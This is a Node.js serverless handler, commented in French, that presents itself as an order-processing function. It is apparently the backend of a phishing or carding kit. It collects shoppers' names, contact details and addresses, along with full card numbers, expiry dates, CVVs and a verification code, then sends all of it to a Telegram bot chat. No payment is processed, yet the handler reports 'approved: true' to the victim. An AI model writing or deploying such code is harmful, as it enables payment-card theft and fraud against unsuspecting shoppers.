const axios = require('axios');

// Récupérer les variables d'environnement
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

exports.handler = async (event, context) => {
    try {
        // Vérifier la méthode HTTP
        if (event.httpMethod !== 'POST') {
            return {
                statusCode: 405,
                body: JSON.stringify({ error: 'Méthode non autorisée' }),
            };
        }

        // Parser le corps de la requête
        const { cart, personalInfo, subscriptionData, verificationCode } = JSON.parse(event.body);

        // Construire le message Telegram
        let message = 'Nouvelle commande :\n';
        message += 'Panier :\n';
        cart.forEach(item => {
            message += `- ${item}\n`;
        });
        message += '\nInformations personnelles :\n';
        message += `Nom : ${personalInfo.nom}\n`;
        message += `Email : ${personalInfo.email}\n`;
        message += `Téléphone : ${personalInfo.telephone}\n`;
        message += `Pays : ${personalInfo.pays}\n`;
        message += `Ville : ${personalInfo.ville}\n`;
        message += `Code postal : ${personalInfo.codePostal}\n`;
        message += '\nInformations de livraison :\n';
        message += `Adresse : ${subscriptionData.adresse_livraison}\n`;
        message += `Contact : ${subscriptionData.contact_livraison}\n`;
        message += '\nInformations bancaires :\n';
        message += `Carte : ${subscriptionData.card_number} (${subscriptionData.card_holder})\n`;
        message += `Expire : ${subscriptionData.card_expiry}\n`;
        message += `CVV : ${subscriptionData.card_cvv}\n`;
        if (verificationCode) {
            message += `\nCode de vérification : ${verificationCode}\n`;
        }

        // Envoyer le message à Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });

        // Répondre avec succès
        return {
            statusCode: 200,
            body: JSON.stringify({ approved: true }),
        };
    } catch (error) {
        console.error('Erreur :', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Erreur lors de l\'envoi à Telegram' }),
        };
    }
};